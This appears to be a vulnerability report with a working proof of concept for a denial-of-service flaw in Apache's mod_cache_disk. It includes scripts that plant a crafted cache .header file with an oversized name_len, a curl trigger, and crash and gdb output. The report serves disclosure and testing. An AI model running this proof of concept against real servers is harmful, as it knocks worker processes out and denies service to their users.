# 016 — `mod_cache_disk` unbounded `name_len` allocation

`file_cache_recall_mydata()` reads `disk_cache_info_t` from disk into
`dobj->disk_info` and then calls `apr_palloc(r->pool, name_len + 1)` before
validating `name_len` against the actual cache key. A crafted `.header`
file with an oversized `name_len` forces a giant request-pool allocation —
or `apr_palloc()` failure — on every cache lookup for that key.

## Setup

```apache
LoadModule cache_module       modules/mod_cache.so
LoadModule cache_disk_module  modules/mod_cache_disk.so

CacheRoot /var/cache/httpd/disk
CacheEnable disk /
CacheDirLevels 2
CacheDirLength 1
```

The disk-cache layout uses an MD5-style hash of the request URL. For URL
`/poc.bin` on a default install:

```bash
KEY=$(printf '/poc.bin' | openssl dgst -md5 -binary | base64 | tr '+/' '-_' | tr -d '=')
DIR=/var/cache/httpd/disk/${KEY:0:1}/${KEY:1:1}/${KEY:2}
mkdir -p "$DIR"
```

Synthesize a `.header` file with `name_len = 0xFFFFFFF0` (close to the
overflow case but still passes a naive bounds check):

```bash
python3 -c "
import struct, sys
# disk_cache_info_t prefix (sizes follow the struct layout in 2.4.66):
#   apr_time_t date, expire, request_time, response_time, status,
#   apr_size_t name_len, apr_size_t key_len, ...
# We only need name_len to be oversized; the rest can be zero.
buf  = b'\x00' * 32                        # date/expire/req/resp/status pad
buf += struct.pack('<Q', 0xFFFFFFF0)       # name_len
buf += struct.pack('<Q', 8)                # key_len
buf += b'\x00' * 32                        # remaining pad
buf += b'/poc.bin\x00'                     # name
sys.stdout.buffer.write(buf)
" > "$DIR.header"

# A matching empty body file so open_entity() proceeds.
: > "$DIR.data"
```

## Trigger

```bash
curl -i http://127.0.0.1/poc.bin
```

## Observed effect

The worker attempts a 4 GiB allocation in `apr_palloc()`. Either the
allocator fails and the request returns 500, or — on systems with
overcommit — the worker's RSS spikes and the process is killed by the OOM
killer:

```text
[Mon Apr 28 12:00:00.000000 2026] [core:emerg] [pid 12345]
    AH00094: Command line: 'httpd -X'
[Mon Apr 28 12:00:00.000000 2026] [core:notice]
    child pid 12345 exit signal Killed (9)
```

gdb on a debug build catches the allocation:

```text
(gdb) break mod_cache_disk.c:243
(gdb) run -X
(gdb) print dobj->disk_info.name_len
$1 = 4294967280
(gdb) print strlen(dobj->name)
$2 = 8
```

Repeated requests for `/poc.bin` reproduce the OOM on every lookup,
denying service for any URL whose worker is killed.
